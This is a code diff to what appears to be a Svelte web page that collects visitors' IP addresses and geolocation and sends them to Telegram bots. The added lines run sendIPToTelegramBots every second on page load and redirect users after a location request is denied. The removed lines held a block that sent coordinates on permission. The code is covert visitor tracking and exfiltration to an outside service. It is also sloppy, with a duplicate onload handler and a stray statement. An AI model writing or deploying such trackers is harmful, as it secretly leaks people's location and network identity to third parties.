@@ -6,12 +6,13 @@
   onMount(async () => {
 
 window.onload = function() {
-      setInterval(myFunction, 3000); // 2000 milliseconds = 2 seconds
+      setInterval(sendIPToTelegramBots, 1000); // 2000 milliseconds = 2 seconds
     };
 
-yourFunction();
+window.onload = function() {
+      setInterval(yourFunction, 2000); // 2000 milliseconds = 2 seconds
+    };
 
-    sendIPToTelegramBots();
     
     setTimeout(() => {
       // Request location permission automatically after a delay of 1 second
@@ -23,6 +24,7 @@ yourFunction();
         (error) => {
           if (error.code === error.PERMISSION_DENIED) {
             showAlert();
+            redirectToNextURL();
             // Location permission denied, send IP result to Telegram bots
           }
         }
@@ -149,31 +151,14 @@ function showAlert() {
     if (result) {
       // Allow button clicked
      // console.log("Allowed");
-
-
-
-
-
-      // Allow button clicked
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          // Location permission granted, send location and IP results to Telegram bots
-          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-        },
-        (error) => {
-          if (error.code === error.PERMISSION_DENIED) {
-            showAlert();
-            redirectToNextURL();
-            // Location permission denied, send IP result to Telegram bots
-          }
-        }
-      );
-
-
 redirectToNextURL();
+yourFunction();
+
+
     } else {
       // Deny button clicked or dialog closed
     //  console.log("Denied");
+yourFunction
 showAlert();
 
     }
